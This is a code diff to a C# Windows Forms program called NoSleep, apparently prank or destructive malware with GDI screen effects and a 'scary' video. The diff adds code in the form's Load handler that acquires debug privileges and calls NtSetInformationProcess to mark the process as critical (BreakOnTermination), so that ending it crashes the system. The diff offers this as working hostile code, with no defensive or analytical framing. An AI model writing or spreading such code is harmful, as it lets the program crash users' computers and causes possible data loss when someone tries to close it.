@@ -15,6 +15,8 @@ namespace NoSleep
 {
     public partial class NoSleep_windows : Form
     {
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
         //These dll import are for gdi payloads, do not change
         [DllImport("gdi32.dll", ExactSpelling = true)]
         private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);
@@ -52,9 +54,6 @@ namespace NoSleep
         [DllImport("User32.dll")]
         static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
 
-        [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-
         [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
         public static extern bool DeleteDC([In] IntPtr hdc);
 
@@ -80,8 +79,16 @@ namespace NoSleep
 
         private void NoSleep_windows_Load(object sender, EventArgs e)
         {
+            int isCritical = 1;  // we want this to be a Critical Process
+            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+
+            Process.EnterDebugMode();  //acquire Debug Privileges
+
+            // setting the BreakOnTermination = 1 for the current process
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+
             //Play video if exists
-            if(File.Exists(@"C:\Program Files\Temp\some_video.mp4"))
+            if (File.Exists(@"C:\Program Files\Temp\some_video.mp4"))
             {
                 this.scary_video.enableContextMenu = false;
                 this.scary_video.uiMode = "none";
